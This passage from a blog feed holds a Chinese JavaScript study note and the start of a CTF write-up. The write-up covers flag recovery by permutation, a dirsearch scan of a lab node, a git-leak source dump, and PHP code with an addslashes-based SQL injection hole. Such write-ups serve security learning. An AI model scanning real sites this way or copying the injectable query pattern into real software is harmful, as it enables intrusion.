src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233201625.png" alt="image-20220407233201625"></p><h1 id="对象数据类型"><a href="#对象数据类型" class="headerlink" title="对象数据类型"></a>对象数据类型</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233307155.png" alt="image-20220407233307155"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233549115.png" alt="image-20220407233549115"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233644769.png" alt="image-20220407233644769"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233455066.png" alt="image-20220407233455066"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233504184.png" alt="image-20220407233504184"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233523944.png" alt="image-20220407233523944"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233615368.png" alt="image-20220407233615368"></p><h1 id="数组数据类型"><a href="#数组数据类型" class="headerlink" title="数组数据类型"></a>数组数据类型</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233743737.png" alt="image-20220407233743737"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233840225.png" alt="image-20220407233840225"></p><h1 id="数组常用方法"><a href="#数组常用方法" class="headerlink" title="数组常用方法"></a>数组常用方法</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000927943.png" alt="image-20220408000927943"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234008850.png" alt="image-20220407234008850"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234023183.png" alt="image-20220407234023183"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234038569.png" alt="image-20220407234038569"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234054841.png" alt="image-20220407234054841"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234110601.png" alt="image-20220407234110601"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234132600.png" alt="image-20220407234132600"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234420968.png" alt="image-20220407234420968"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234514112.png" alt="image-20220407234514112"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234540680.png" alt="image-20220407234540680"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234754392.png" alt="image-20220407234754392"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234822279.png" alt="image-20220407234822279"></p><p>包前不包后</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000322543.png" alt="image-20220408000322543"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000514401.png" alt="image-20220408000514401"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000635298.png" alt="image-20220408000635298"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000653869.png" alt="image-20220408000653869"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000714136.png" alt="image-20220408000714136"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000753278.png" alt="image-20220408000753278"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000801246.png" alt="image-20220408000801246"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001013869.png" alt="image-20220408001013869"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001035076.png" alt="image-20220408001035076"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000830365.png" alt="image-20220408000830365"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000847454.png" alt="image-20220408000847454"></p><h1 id="字符串常用方法"><a href="#字符串常用方法" class="headerlink" title="字符串常用方法"></a>字符串常用方法</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001751547.png" alt="image-20220408001751547"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001220640.png" alt="image-20220408001220640"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001232044.png" alt="image-20220408001232044"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001300510.png" alt="image-20220408001300510"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001325030.png" alt="image-20220408001325030"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001357820.png" alt="image-20220408001357820"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001425680.png" alt="image-20220408001425680"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001432558.png" alt="image-20220408001432558"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001456688.png" alt="image-20220408001456688"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001513319.png" alt="image-20220408001513319"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001558293.png" alt="image-20220408001558293"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001728712.png" alt="image-20220408001728712"></p><h1 id="数字常用方法"><a href="#数字常用方法" class="headerlink" title="数字常用方法"></a>数字常用方法</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002711294.png" alt="image-20220408002711294"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001857190.png" alt="image-20220408001857190"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001921068.png" alt="image-20220408001921068"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001959789.png" alt="image-20220408001959789"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002017326.png" alt="image-20220408002017326"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002033918.png" alt="image-20220408002033918"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002053540.png" alt="image-20220408002053540"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002112036.png" alt="image-20220408002112036"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002122229.png" alt="image-20220408002122229"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002133196.png" alt="image-20220408002133196"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002147147.png" alt="image-20220408002147147"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002152859.png" alt="image-20220408002152859"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002208364.png" alt="image-20220408002208364"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002217762.png" alt="image-20220408002217762"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002233052.png" alt="image-20220408002233052"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002257196.png" alt="image-20220408002257196"></p><h1 id="时间常用方法"><a href="#时间常用方法" class="headerlink" title="时间常用方法"></a>时间常用方法</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002836962.png" alt="image-20220408002836962"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002855807.png" alt="image-20220408002855807"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003002403.png" alt="image-20220408003002403"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003019626.png" alt="image-20220408003019626"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003107445.png" alt="image-20220408003107445"></p><h1 id="JavaScript的BOM操作"><a href="#JavaScript的BOM操作" class="headerlink" title="JavaScript的BOM操作"></a>JavaScript的BOM操作</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410161902503.png" alt="image-20220410161902503"></p><p><strong>1、获取浏览器窗口尺寸</strong></p><pre><code>获取可视窗口宽度: window.innerWidth获取可视窗口高度: window.innerHeight</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410162216868.png" alt="image-20220410162216868"></p><p><strong>2、浏览器的弹出层</strong></p><pre><code>提示框: window.alert(&#39;提示信息&#39;)询问框: window.confirm(&#39;提示信息&#39;) 返回 true和false输入框: window.prompt(&#39;提示信息&#39;) 点确定，返回输入框中内容，点取消返回null</code></pre><p><strong>3、开启和关闭标签页</strong></p><pre><code>开启: window.open(&#39;地址&#39;)关闭: window.close()</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410162721520.png" alt="image-20220410162721520"></p><p><strong>4、浏览器常见事件</strong></p><pre><code>资源加载完毕: window.onload = function() &#123;&#125;可视尺寸改变: window.onresize = function()&#123;&#125;滚动条位置改变: window.onscroll = function()&#123;&#125;</code></pre><ol><li>在页面资源加载完毕执行</li></ol><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163103734.png" alt="image-20220410163103734"></p><ol start="2"><li><p>可视窗口发生变化时执行</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163226827.png" alt="image-20220410163226827"></p></li><li><p>滚动条位置改变时执行</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163327867.png" alt="image-20220410163327867"></p></li></ol><p><strong>5、浏览器历史记录操作</strong></p><pre><code>回退页面:window.history.back()前进页面: window.history.forward</code></pre><p><strong>6、浏览器卷去尺寸</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163708715.png" alt="image-20220410163708715"></p><ol><li><p>卷去的高度</p><pre><code>document.documentElement.scrollTop #当有&lt;!DOCTYPE html&gt;用这个document.body.scrollTop #当没有&lt;!DOCTYPE html&gt;用这个</code></pre><p>兼容写法</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164045152.png" alt="image-20220410164045152"></p></li><li><p>卷去宽度</p><pre><code>document.documentElement.scrollleft #当有&lt;!DOCTYPE html&gt;用这个document.body.scrollleft #当没有&lt;!DOCTYPE html&gt;用这个</code></pre><p>兼容写法:</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164228039.png" alt="image-20220410164228039"></p></li></ol><p><strong>7、浏览器滚动到</strong></p><pre><code>window.scrolloTo()  #滚动到参数方式1(瞬间定位): window.scrollTo(left,top)        left:浏览器卷去高度        top:浏览器卷去高度参数方式2(滚动定位): window.scrollTo(&#123;        left: xx        top: yy        behavior:&#39;smooth&#39;  #表示平滑滚动&#125;)</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164500900.png" alt="image-20220410164500900"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164841389.png" alt="image-20220410164841389"></p><h1 id="JavaScript定时器"><a href="#JavaScript定时器" class="headerlink" title="JavaScript定时器"></a>JavaScript定时器</h1><p><strong>间隔定时器</strong></p><pre><code>按照指定周期(毫秒)去执行指定的代码语法: setInterval(函数,时间)函数: 每次要执行的内容时间: 单位是毫秒</code></pre><p>示例代码</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;sakura&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            setInterval(function()&#123;                console.log(&#39;执行一次&#39;)            &#125;,1000)  # 单位毫秒，这里也就是1秒        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411122709604.png" alt="image-20220411122709604"></p><p>延时定时器</p><pre><code>在固定的时间(毫秒)后指定一次代码语法: setTimeout(函数,时间)函数: 时间到达执行的内容时间: 单位是毫秒</code></pre><p>示例代码</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;sakura&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            setTimeout(function()&#123;                console.log(&#39;执行一次&#39;)            &#125;,1000)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411122948862.png" alt="image-20220411122948862"></p><p><strong>定时器返回值</strong></p><pre><code>不区分定时器种类表示是当前页面的第几个定时器</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411123144526.png" alt="image-20220411123144526"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411123157829.png" alt="image-20220411123157829"></p><p>是不区分种类的，只表示是页面第几个定时器</p><p><strong>关闭定时器</strong></p><pre><code>语法一: clearInterval(要关闭的定时器返回值)语法二: clearTimeout(要关闭的定时器返回值)这是不区分定时器种类的可以互相关闭</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135402168.png" alt="image-20220411135402168"></p><h1 id="DOM基本操作"><a href="#DOM基本操作" class="headerlink" title="DOM基本操作"></a>DOM基本操作</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135516647.png" alt="image-20220411135516647"></p><p><strong>获取元素方式</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135606813.png" alt="image-20220411135606813"></p><ol><li><p>根据id名称获取</p><pre><code>语法: document.getElementById(&#39;id名称&#39;)作用: 获取文档流中id名对应的一个元素返回值:    如果有id对应的元素，就是这个元素    如果没有id对应的元素，就是null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411140343642.png" alt="image-20220411140343642"></p></li><li><p>根据元素类名获取</p><pre><code>语法: document.getElementsByClassName(&#39;元素类名&#39;)作用: 获取文档流中所有类名对应的元素返回值: 必定是一个伪数组    如果有类名对应的元素，有多少获取多少    如果没用类名对应的元素，空的伪数组</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411141050751.png" alt="image-20220411141050751"></p></li><li><p>根据元素标签名获取</p><pre><code>语法: document.getElementsByTagName(&#39;标签名&#39;)作用； 获取文档流中所有标签名对应的元素返回值；必然是一个伪数组    如果有标签名对应的元素，有多少获取多少    如果没用标签名对应的元素，空的伪数组</code></pre><p> <img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411141947898.png" alt="image-20220411141947898"></p></li><li><p>根据选择器获取一个</p><pre><code>语法； document.querySelector(&#39;选择器&#39;)作用: 获取文档流中满足选择器规则的第一个元素返回值:    如果有选择器对应的元素，获取到第一个    如果没用选择器对应的元素，返回null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411142650050.png" alt="image-20220411142650050"></p></li><li><p>根据选择器获取一组</p><pre><code>语法:document.querySelectorAll(&#39;选择器&#39;)作用: 获取文档流中所有满足选择器规则的元素返回值: 必然是一个伪数组    如果有选择器对应的元素，获取到第一个    如果没用选择器对应的元素，返回null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411143324177.png" alt="image-20220411143324177"></p></li></ol><p><strong>操作元素内容</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144452327.png" alt="image-20220411144452327"></p><ol><li><p>操作元素文本内容</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144426234.png" alt="image-20220411144426234"></p></li><li><p>操作元素超文本内容</p></li></ol><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144816538.png" alt="image-20220411144816538"></p><p><strong>操作元素属性</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411145038287.png" alt="image-20220411145038287"></p><ol><li><p>原生属性</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411145906291.png" alt="image-20220411145906291"></p></li><li><p>自定义属性</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411150625140.png" alt="image-20220411150625140"></p></li></ol><p><strong>操作元素类名</strong></p><pre><code>获取: 元素.className设置； 元素.className = &#39;新类名&#39;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411151419501.png" alt="image-20220411151419501"></p><p><strong>操作元素行内样式</strong></p><pre><code>获取: 元素.style.样式名设置: 元素.style.样式名 = &#39;样式值&#39;注意: 只能获取和设置元素的行内样式</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152231051.png" alt="image-20220411152231051"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152308257.png" alt="image-20220411152308257"></p><p><strong>获取元素非行内样式</strong></p><pre><code>获取:window.getComputedStyle(元素).样式名注意； 可以获取行内样式，也可以获取非行内样式</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152807202.png" alt="image-20220411152807202"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;该来的永远跑不掉，该补的早晚要补，诶，好好学javascript，我爱学习！！！！！&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;历史&quot;&gt;&lt;a href=&quot;#历史&quot; class=&quot;headerlink&quot; title=&quot;历史&quot;&gt;&lt;/a&gt;历史&lt;/h1&gt;&lt;p&gt;&lt;img sr</summary>
      
    
    
    
    <category term="语言" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/"/>
    
    <category term="javascript" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/javascript/"/>
    
    
    <category term="javascript" scheme="https://sakurahack-y.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>ctf刷题-第一周题目</title>
    <link href="https://sakurahack-y.github.io/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/"/>
    <id>https://sakurahack-y.github.io/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/</id>
    <published>2022-03-28T12:25:15.000Z</published>
    <updated>2022-04-06T16:47:13.445Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h1><p><strong>Web方向：</strong></p><p>[b01lers2020]Welcome to Earth</p><p>[网鼎杯 2018]Comment</p><p>[GYCTF2020]Ezsqli</p><p>[网鼎杯 2020 白虎组]PicDown</p><p>[watevrCTF-2019]Cookie Store</p><p>[SWPUCTF 2018]SimplePHP</p><p>[WUSTCTF2020]CV Maker</p><p>[HarekazeCTF2019]encode_and_encode</p><p>[红明谷CTF 2021]write_shell</p><p>[SUCTF 2019]EasyWeb</p><p>[RootersCTF2019]I_&lt;3_Flask</p><p>[NCTF2019]SQLi</p><p>[NPUCTF2020]ezinclude</p><p>[CISCN2019 华东南赛区]Double Secret</p><h1 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h1><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>进去后，它会直接提示我，我die了，但是我们可以注意到它有个一闪而过的画面。</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203228318.png" alt="image-20220328203228318"></p><p>在这个页面没有发现，使用burp抓包</p><p>抓到</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203639569.png" alt="image-20220328203639569"></p><p>查看源代码，发现了个有趣的路径</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204251360.png" alt="image-20220328204251360"></p><p>继续用burp抓包打开</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204549649.png" alt="image-20220328204549649"></p><p>这两个都点击后，没有效果</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204655545.png" alt="image-20220328204655545"></p><p>查看下源代码，发现一个可疑路径</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204718322.png" alt="image-20220328204718322"></p><p>进入后，界面如下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204815035.png" alt="image-20220328204815035"></p><p>点击按钮，又会die</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204844208.png" alt="image-20220328204844208"></p><p>继续查看源代码，无限套娃呗</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204931097.png" alt="image-20220328204931097"></p><p>进去</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205009037.png" alt="image-20220328205009037"></p><p>点击continue<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205120224.png" alt="image-20220328205120224"></p><p>要选择一个正确的数字，但是太多了吧，先看看源代码吧，发现如下js代码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205425890.png" alt="image-20220328205425890"></p><p>嘿嘿，不用一个个试了，直接到open目录</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205558332.png" alt="image-20220328205558332"></p><p>继续查看源代码，发现fight目录</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205711090.png" alt="image-20220328205711090"></p><p>进入，一个可怕的外星人</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205745540.png" alt="image-20220328205745540"></p><p>继续查看源代码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205854907.png" alt="image-20220328205854907"></p><p>发现flag的顺序被打算，想要反解函数不现实，尝试全排列</p><pre><code>itertools.permutations()：就是返回可迭代对象的所有数学全排列方式,它以任意迭代作为参数，并始终返回生成元组的迭代器。它没有(也不应该)特殊的字符串。要获得字符串列表，您可以自己加入元组： list(map(&quot;&quot;.join, itertools.permutations(&#39;1234&#39;)))</code></pre><pre><code class="python">from itertools import permutationsflag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]item = permutations(flag)for i in item:    #print (i)    k=&quot;&quot;.join(i)    #print(k)    if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1]==&#39;&#125;&#39;:        print(k)</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328215044738.png" alt="image-20220328215044738"></p><p>找到可能的flag，尝试即可</p><p>最终flag为</p><pre><code>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</code></pre><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>需要登录才能发帖</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231641292.png" alt="image-20220328231641292"></p><p>.给了账号和密码前几位，直接burp爆破</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231742892.png" alt="image-20220328231742892"></p><p>成功爆破出密码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231810749.png" alt="image-20220328231810749"></p><p>没发现什么有用的，用dirsearch扫一下目录，注意，由于buu很容易崩溃，要降低速度</p><pre><code>python dirsearch.py -u http://bc06d5bc-c6b1-49d6-b004-e2f130e630ae.node4.buuoj.cn:81/ -e php -t 2 -s 0.2 -o C:\User\Sakura\Desktop\2.txt</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232440677.png" alt="image-20220328232440677"></p><p>发现git泄露,使用githack扒出源码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232710003.png" alt="image-20220328232710003"></p><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    break;case &#39;comment&#39;:    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p>但是这段代码明显不完整</p><p>使用(这里推荐使用linux，我用windows出现了错误)</p><pre><code>git log --all</code></pre><p>查一下之前提交的版本</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000637723.png" alt="image-20220329000637723"></p><p>恢复到初始版本</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000916068.png" alt="image-20220329000916068"></p><p>成功得到完整源码</p><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category = addslashes($_POST[&#39;category&#39;]);    $title = addslashes($_POST[&#39;title&#39;]);    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into board            set category = &#39;$category&#39;,                title = &#39;$title&#39;,                content = &#39;$content&#39;&quot;;    $result = mysql_query($sql);    header(&quot;Location: ./index.php&quot;);    break;case &#39;comment&#39;:    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    if($num&gt;0)&#123;    $category = mysql_fetch_array($result)[&#39;category&#39;];    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into comment            set category = &#39;$category&#39;,                content = &#39;$content&#39;,                bo_id = &#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    &#125;    header(&quot;Location: ./comment.php?id=$bo_id&quot;);    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p>开始审计代码</p><p>先介绍下addslashes函数</p><pre><code>addslashes() 函数在指定的预定义字符前添加反斜杠。这些字符是单引号（&#39;）、双引号（&quot;）、反斜线（\）与NUL（NULL字符）。</code></pre><p>逻辑其实很清晰</p><p><img 